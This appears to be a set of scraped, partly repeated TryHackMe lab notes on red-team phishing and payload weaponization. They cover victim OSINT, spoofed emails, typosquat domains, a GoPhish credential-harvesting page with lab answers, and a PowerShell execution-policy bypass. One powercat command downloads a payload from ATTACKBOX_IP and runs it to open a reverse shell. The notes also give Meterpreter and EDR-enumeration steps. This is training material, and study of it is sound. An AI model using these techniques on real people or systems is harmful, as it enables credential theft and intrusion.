information and also have somewhere to launch another phishing attack against other employees. Alt text Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign. What type of psychological manipulation is phishing part of? Social engineering What type of phishing campaign do red teams get involved in? spear-phishing Task 3: Writing Convincing Phishing Emails \u00b6 We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with? OSINT What should be changed on an HTML anchor tag to disguise a link? anchor text Task 4: Phishing Infrastructure \u00b6 A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign. Domain Name : You'll need to register either an authentic-looking domain name or one that mimics the identity of another domain. See task 5 for details on how to create the perfect domain name. SSL/TLS Certificates : Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack. Email Server/Account : You'll need to either set up an email server or register with an SMTP email provider. DNS Records : Setting up DNS Records such as SPF, DKIM, DMARC will improve the deliverability of your emails and make sure they're getting into the inbox rather than the spam folder. Web Server : You'll need to set up webservers or purchase web hosting from a company to host your phishing websites. Adding SSL/TLS to the websites will give them an extra layer of authenticity. Analytics : When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need something to keep track of the emails that have been sent, opened or clicked. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. Automation And Useful Software : Some of the above infrastructures can be quickly automated by using the below tools. GoPhish - (Open-Source Phishing Framework) - getgophish.com GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked. The Next task will talk you through how to launch a phishing campaign using this software.

Alt text You should be able to log in with the username: admin and password: tryhackme Sending Profiles : \u00b6 Sending profiles are the connection details required to actually send your Phishing emails; this is just simply an SMTP server that you have access to. Click the Sending Profiles link on the left-hand menu and then click the \"New Profile\" button. Next, add in the following information as per the screenshot below: Name: Local Server From: noreply@redteam.thm Host: 127.0.0.1:25 Alt text Then click Save Profile. Landing Pages : \u00b6 Next, we're going to set up the landing page; this is the website that the Phishing email is going to direct the victim to; this page is usually a spoof of a website the victim is familiar with. Click the Landing Pages link on the left-hand menu and then click the \"New Page\" button. Give the Landing Page the name ACME Login , next in the HTML box; you'll need to press the Source button to allow us to enter the HTML code as shown below: <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > ACME IT SUPPORT - Admin Panel </ title > < style > body { font-family : \"Ubuntu\" , monospace ; text-align : center } div . login-form { margin : auto ; width : 300 px ; border : 1 px solid #ececec ; padding : 10 px ; text-align : left ; font-size : 13 px ;} div . login-form div input { margin-bottom : 7 px ;} div . login-form input { width : 280 px ;} div . login-form div : last-child { text-align : center ; } div . login-form div : last-child input { width : 100 px ;} </ style > </ head > < body > < h2 > ACME IT SUPPORT </ h2 > < h3 > Admin Panel </ h3 > < form method = \"post\" > < div class = \"login-form\" > < div > Username: </ div > < div >< input name = \"username\" ></ div > < div > Password: </ div > < div >< input type = \"password\" name = \"password\" ></ div > < div >< input type = \"submit\" value = \"Login\" ></ div > </ div > </ form > </ body > </ html > Click the Source button again, and you should see a login box with username and password fields as per the image below, also click the Capture Submitted Data box and then also the Capture Passwords box and then click the Save Page button. Alt text Email Templates : \u00b6 This is the design and content of the email you're going to actually send to the victim; it will need to be persuasive and contain a link to your landing page to enable us to capture the victim's username and password. Click the Email Templates link on the left-hand menu and then click the New Template button. Give the template the name Email 1, the subject New Message Received, click the HTML tab, and then the Source button to enable HTML editor mode. In the contents write a persuasive email that would convince the user to click the link, the link text will need to be set to https://admin.acmeitsupport.thm , but the actual link will need to be set to {{.URL}} which will get changed to our spoofed landing page when the email gets sent, you can do this by highlighting the link text and then clicking the link button on the top row of icons, make sure to set the protocol dropdown to .

Alt text You'll then be redirected to the results page of the campaign. Results \u00b6 The results page gives us an idea of how the phishing campaign is performing by letting us know how many emails have been delivered, opened, clicked and how many users have submitted data to our spoof website. You'll see at the bottom of the screen a breakdown for each email address; you'll notice that both Martin's and Brian's email has been sent successfully, but the account's email has resulted in an error. Alt text We can dig in the error more by clicking the dropdown arrow next to the account's row, and by viewing the details or the error, we can see an error message saying the user is unknown. Alt text After a minute and providing you've followed the instructions correctly, you should see the status of brian change to Submitted Data .

Alt text Answer the questions below \u00b6 What is the password for Brian? p4$$w0rd! Task 6: Droppers \u00b6 Droppers are software that phishing victims tend to be tricked into downloading and running on their system. The dropper may advertise itself as something useful or legitimate such as a codec to view a certain video or software to open a specific file. The droppers are not usually malicious themselves, so they tend to pass antivirus checks. Once installed, the intended malware is either unpacked or downloaded from a server and installed onto the victim's computer. The malicious software usually connects back to the attacker's infrastructure. The attacker can take control of the victim's computer, which can further explore and exploit the local network. Answer the questions bellow \u00b6 Do droppers tend to be malicious? nay Task 7: Choosing A Phishing Domain \u00b6 Choosing the right Phishing domain to launch your attack from is essential to ensure you have the psychological edge over your target. A red team engagement can use some of the below methods for choosing the perfect domain name. Expired Domains : \u00b6 Although not essential, buying a domain name with some history may lead to better scoring of your domain when it comes to spam filters. Spam filters have a tendency to not trust brand new domain names compared to ones with some history Typosquatting : \u00b6 Typosquatting is when a registered domain looks very similar to the target domain you're trying to impersonate. Here are some of the common methods: Misspelling : goggle.com Vs google.com Additional Period : go.ogle.com Vs google.com Switching numbers for letters : g00gle.com Vs google.com Phrasing : googles.com Vs google.com Additional Word : googleresults.com Vs google.com TLD Alternatives : \u00b6 A TLD (Top Level Domain) is the .com .net .co.uk .org .gov e.t.c part of a domain name, there are 100's of variants of TLD's now. A common trick for choosing a domain would be to use the same name but with a different TLD. For example, register tryhackme.co.uk to impersonate tryhackme.com. IDN Homograph Attack/Script Spoofing : Originally domain names were made up of Latin characters a-z and 0-9, but in 1998, IDN (internationalized domain name) was implemented to support language-specific script or alphabet from other languages such as Arabic, Chinese, Cyrillic, Hebrew and more. An issue that arises from the IDN implementation is that different letters from different languages can actually appear identical. For example, Unicode character U+0430 (Cyrillic small letter a) looks identical to Unicode character U+0061 (Latin small letter a) used in English, enabling attackers to register a domain name that looks almost identical to another. Alt text Answer the questions bellow \u00b6 What is better, using an expired or new domain? (old/new) old What is the term used to describe registering a similar domain name with a spelling error? Typosquatting Task 8: Using MS Office In Phishing \u00b6 Often during phishing campaigns, a Microsoft Office document (typically Word, Excel or PowerPoint) will be included as an attachment. Office documents can contain macros; macros do have a legitimate use but can also be used to run computer commands that can cause malware to be installed onto the victim's computer or connect back to an attacker's network and allow the attacker to take control of the victim's computer. Take, for example, the following scenario : A staff member working for Acme IT Support receives an email from human resources with an excel spreadsheet called \"Staff_Salaries.xlsx\" intended to go to the boss but somehow ended up in the staff members inbox instead. What really happened was that an attacker spoofed the human resources email address and crafted a psychologically tempting email perfectly aimed to tempt the staff member into opening the attachment. Once the staff member opened the attachment and enabled the macros, their computer was compromised. Answer the question bellow \u00b6 What can Microsoft Office documents contain, which, when executed can run computer commands? macros Task 9: Using Browser Exploits \u00b6 Another method of gaining control over a victim's computer could be through browser exploits; this is when there is a vulnerability against a browser itself (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows the attacker to run remote commands on the victim's computer. Browser exploits aren't usually a common path to follow in a red team engagement unless you have prior knowledge of old technology being used on-site. Many browsers are kept up to date, hard to exploit due to how browsers are developed, and the exploits are often worth a lot of money if reported back to the developers. That being said, it can happen, and as previously mentioned, it could be used to target old technologies on-site because possibly the browser software cannot be updated due to incompatibility with commercial software/hardware, which can happen quite often in big institutions such as education, government and especially health care. Usually, the victim would receive an email, convincing them to visit a particular website set up by the attacker. Once the victim is on the site, the exploit works against the browser, and now the attacker can perform any commands they wish on the victim's computer. An example of this is CVE-2021-40444 from September 2021, which is a vulnerability found in Microsoft systems that allowed the execution of code just from visiting a website. Answer the questions bellow \u00b6 Which recent CVE caused remote code execution?

No needed answer","title":"Task 1: Brief"},{"location":"tryhackme/room/phishing/#task-2-intro-to-phishing-attacks","text":"Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company information and also have somewhere to launch another phishing attack against other employees.

Social engineering What type of phishing campaign do red teams get involved in? spear-phishing","title":"Task 2: Intro To Phishing Attacks"},{"location":"tryhackme/room/phishing/#task-3-writing-convincing-phishing-emails","text":"We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with?

Once the staff member opened the attachment and enabled the macros, their computer was compromised.","title":"Task 8: Using MS Office In Phishing"},{"location":"tryhackme/room/phishing/#answer-the-question-bellow","text":"What can Microsoft Office documents contain, which, when executed can run computer commands? macros","title":"Answer the question bellow"},{"location":"tryhackme/room/phishing/#task-9-using-browser-exploits","text":"Another method of gaining control over a victim's computer could be through browser exploits; this is when there is a vulnerability against a browser itself (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows the attacker to run remote commands on the victim's computer. Browser exploits aren't usually a common path to follow in a red team engagement unless you have prior knowledge of old technology being used on-site. Many browsers are kept up to date, hard to exploit due to how browsers are developed, and the exploits are often worth a lot of money if reported back to the developers. That being said, it can happen, and as previously mentioned, it could be used to target old technologies on-site because possibly the browser software cannot be updated due to incompatibility with commercial software/hardware, which can happen quite often in big institutions such as education, government and especially health care. Usually, the victim would receive an email, convincing them to visit a particular website set up by the attacker. Once the victim is on the site, the exploit works against the browser, and now the attacker can perform any commands they wish on the victim's computer. An example of this is CVE-2021-40444 from September 2021, which is a vulnerability found in Microsoft systems that allowed the execution of code just from visiting a website.","title":"Task 9: Using Browser Exploits"},{"location":"tryhackme/room/phishing/#answer-the-questions-bellow_2","text":"Which recent CVE caused remote code execution?

Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell . Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints \"Welcome to the Weaponization Room!\" as follows, Write-Output \"Welcome to the Weaponization Room!\" Save the file as thm.ps1 . With the Write-Output , we print the message \"Welcome to the Weaponization Room!\" to the command prompt. Now let's run it and see the result. CMD C :\\ Users \\ thm \\ Desktop > powershell -File thm . ps1 File C :\\ Users \\ thm \\ Desktop \\ thm . ps1 cannot be loaded because running scripts is disabled on this system .

By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted , which means it permits individual commands but not run any scripts. CMD PS C :\\ Users \\ thm > Get-ExecutionPolicy Restricted We can also easily change the PowerShell execution policy by running: CMD PS C :\\ Users \\ thm \\ Desktop > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust .

[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A Bypass Execution Policy \u00b6 Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts. In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, CMD C :\\ Users \\ thm \\ Desktop > powershell -ex bypass -File thm . ps1 Welcome to Weaponization Room ! Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

Resolving deltas : 100 % ( 72 / 72 ), done . Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080 . Terminal user @machine $ cd powercat user @machine $ python3 -m http . server 8080 Serving HTTP on 0 . 0 . 0 . 0 port 8080 ( http :// 0 . 0 . 0 . 0 : 8080 /) ... On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim. Terminal user @machine $ nc -lvp 1337 Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows, Terminal C :\\ Users \\ thm \\ Desktop > powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd\" Now that we have executed the command above, the victim machine downloads the powercat.ps1 payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337 . After a couple of seconds, we should receive the connection call back: Terminal user @machine $ nc -lvp 1337 listening on [any] 1337 ... 10 . 10 . 12 . 53 : inverse host lookup failed : Unknown host connect to [ 10 . 8 . 232 . 37 ] from ( UNKNOWN ) [ 10 . 10 . 12 . 53 ] 49804 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation .

Alt text What is Command and Control ( C2 )? \u00b6 C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement And many others Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system. Cobalt Strike \u00b6 Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements. PowerShell Empire \u00b6 PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire . Metasploit \u00b6 Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the Metasploit module . Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room. Task 8: Delivery Techniques \u00b6 Delivery Techniques \u00b6 Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content. Alt text Email Delivery \u00b6 It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit here . This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host. The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Alt text Web Delivery \u00b6 Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here . This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. Alt text USB Delivery \u00b6 This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit here . Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment. Common USB attacks used to weaponize USB devices include Rubber Ducky and SBHarpoon , charging USB cable, such as O.MG Cable . Task 9: Practice Arena \u00b6 We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/ . Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN. Alt text The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link. Note for Doc files : the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate . In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow, Terminal meterpreter > run post / windows / manage / migrate [*] Running module against DESKTOP - 1AU6NT4 [*] Current server process : svchost . exe ( 3280 ) [*] Spawning notepad . exe process to migrate into [*] Spoofing PPID 0 [*] Migrating into 4960 [+] Successfully migrated into process 4960 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell. For reference, you can use the MSFVenom Cheat Sheet on this website . Answer the questions below What is the flag? Hint: Check the user desktop folder for the flag!

Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

Often, researchers or users submit their infected files into an antivirus engine platform for further analysis by AV vendors, and if it confirms as malicious, then the signature gets registered in their database. The antivirus software compares the scanned file with a database of known signatures for possible attacks and malware on the client-side. If we have a match, then it considers a threat. Heuristic-based detection uses machine learning to decide whether we have the malicious file or not. It scans and statically analyses in real-time in order to find suspicious properties in the application's code or check whether it uses uncommon Windows or system APIs. It does not rely on the signature-based attack in making the decisions, or sometimes it does. This depends on the implementation of the antivirus software. Finally, Behavior-based detection relies on monitoring and examining the execution of applications to find abnormal behaviors and uncommon activities, such as creating/updating values in registry keys, killing/creating processes, etc. As a red teamer, it is essential to be aware of whether antivirus exists or not.

It is software that has the ability to monitor and detect abnormal and malicious activities in a host. The primary purpose of HIDS is to detect suspicious activities and not to prevent them. There are two methods that the host-based or network intrusion detection system works, including: Signature-based IDS - it looks at checksums and message authentication. Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports. Host-based Intrusion Prevention Systems (HIPS) works by securing the operating system activities which where is installed. It is a detecting and prevention solution against well-known attacks and abnormal behaviors. HIPS is capable of auditing log files of the host, monitoring processes, and protecting system resources. HIPS is a mixture of best product features such as antivirus, behavior analysis, network, application firewall, etc. There is also a network-based IDS /IPS, which we will be covering in the next task. Endpoint Detection and Response (EDR) \u00b6 Alt text It is also known as Endpoint Detection and Threat Response (EDTR). The EDR is a cybersecurity solution that defends against malware and other threats. EDRs can look for malicious files, monitor endpoint, system, and network events, and record them in a database for further analysis, detection, and investigation. EDRs are the next generation of antivirus and detect malicious activities on the host in real-time. EDR analyze system data and behavior for making section threats, including Malware, including viruses, trojans, adware, keyloggers Exploit chains Ransomware Below are some common EDR software for endpoints Cylance Crowdstrike Symantec SentinelOne Many others Even though an attacker successfully delivered their payload and bypassed EDR in receiving reverse shell, EDR is still running and monitors the system. It may block us from doing something else if it flags an alert. We can use scripts for enumerating security products within the machine, such as Invoke-EDRChecker and SharpEDRChecker . They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories.

Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports. Host-based Intrusion Prevention Systems (HIPS) works by securing the operating system activities which where is installed. It is a detecting and prevention solution against well-known attacks and abnormal behaviors. HIPS is capable of auditing log files of the host, monitoring processes, and protecting system resources.
